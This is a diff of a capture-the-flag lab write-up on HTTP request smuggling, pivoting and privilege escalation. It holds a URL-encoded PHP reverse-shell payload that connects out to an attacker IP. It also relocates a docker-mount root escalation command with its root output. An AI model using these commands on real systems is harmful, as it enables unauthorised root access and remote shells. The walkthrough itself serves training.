@@ -694,11 +694,7 @@ So we can see that ngix has validated (and upgraded) our request. Now we can try
     Host: 10.10.227.168:8080
 
     
-We will get the flag and the credentials back! At this point, of course, I proceeded to login to the previous found login page:
-
-    
-
-
+We will get the flag and the credentials back! At this point, of course, I proceeded to login to the previous found login page.
 Once logged in we land on a chat system. We can read that Jack is warning us that the time to escape has come, sending some messages to Jack we didn't get any answer. Maybe is too late :).
 Let's proceed to analyze the request generated sending message in Burp. We can see that the protocol is HTTP/2 and that a proxy should be in place since we got the Age header in the back response, knowing that the challenge is on smuggling, the logical next step is to try a downgrade to HTTP/1, since is not possible to smuggle a HTTP/2 request abusing CL or TE. I suggest to read this great [resource](https://portswigger.net/research/http2) written by the mythic James Kettle. 
 In Burp repeater disable automatic upgrade content length and in the inspector column, open the Request attributes section and change the protocol to HTTP/1. Send the request again:
@@ -917,23 +913,7 @@ Nothing really interesting emerged.
 I searched for SUID file, but again, with no luck:
 
     find / -perm -u=s -type f 2>/dev/null
-    /usr/lib/eject/dmcrypt-get-device
-    ...
-    /usr/bin/docker
-    ...
-
-Actually I didn't know how to abuse of docker binary to privilege escalation. Searching around I found this [resource](https://gtfobins.github.io/gtfobins/docker). I took me a while to realize what is this alpine value used in the sample command: that is the name of a running docker image.
-We can search for running docker images as follows:
-
-    docker images -a
-    ....
-    <none>              <none>              d9c4bf86bc87        3 years ago         63.5MB
-    ubuntu              18.04               56def654ec22        3 years ago         63.2MB
-
-The last result row is the one we can use as value for the it parameter:
-
-    docker run -v /:/mnt --rm -i ubuntu:18.04 chroot /mnt bash
-
+   
 Performing other activities to find a way to escalate my privilege, but I didn't find anything
 
 ### Pivoting
@@ -1081,8 +1061,6 @@ At this point we can get a shell using the same payload we used before (remember
      http://192.168.100.1:8080/ws.php?c=php%20-r%20%27%24sock%3Dfsockopen%28%2210.50.74.35%22%2C1222%29%3Bexec%28%22%2Fbin%2Fbash%20-i%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27
 
 ### Flag submissions 2 and 3
-You can find these flags.
-
 Futher investigate the server we notice that the webapp is actually a Docker container, and that the ssh server is active on the Docker interface as well (very insecure configuration):
 
     www-data@ip-10-200-95-33:/var/www/html$ ifconfig 
@@ -1092,9 +1070,36 @@ Futher investigate the server we notice that the webapp is actually a Docker con
     eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 9001
         inet 10.200.95.33  netmask 255.255.255.0  broadcast 10.200.95.255
 
-Again I performed the usual step to privilege escalation. This time looking for SUID binary we found:
+Again I performed the usual step to privilege escalation. This time looking for SUID binary I found:
 
-    
+     find / -perm -u=s -type f 2>/dev/null
+    /usr/lib/eject/dmcrypt-get-device
+    ...
+    /usr/bin/docker
+    ...
+
+Actually I didn't know how to abuse docker binary to escalate my privilege. Searching around I found this [resource](https://gtfobins.github.io/gtfobins/docker). I took me a while to realize what is this alpine value used in the sample command: that is the name of a running docker image:tag
+We can search for running docker images as follows:
+
+    docker images -a
+    REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
+    ....
+    <none>              <none>              d9c4bf86bc87        3 years ago         63.5MB
+    ubuntu              18.04               56def654ec22        3 years ago         63.2MB
+
+The last result row is the one we can use as value for the parameter. The command should return a shel with root privilege:
+
+    docker run -v /:/mnt --rm -it ubuntu:18.04 chroot /mnt sh
+    the input device is not a TTY
+Investigating the error, since our current shell is not a full TTY, the solution is to get rid of the t option. So the command to exploit it is:
+
+    docker run -v /:/mnt --rm -i ubuntu:18.04 chroot /mnt sh
+    <r run -v /:/mnt --rm -i ubuntu:18.04 chroot /mnt sh
+    id
+    uid=0(root) gid=0(root) groups=0(root)
+
+[HERE] --> Hashcat shadow
+
 
 
 From this host we can perform a further host discovery on the 10.200.95.0/24 subnet. Luckily nmap is already installed on the server:
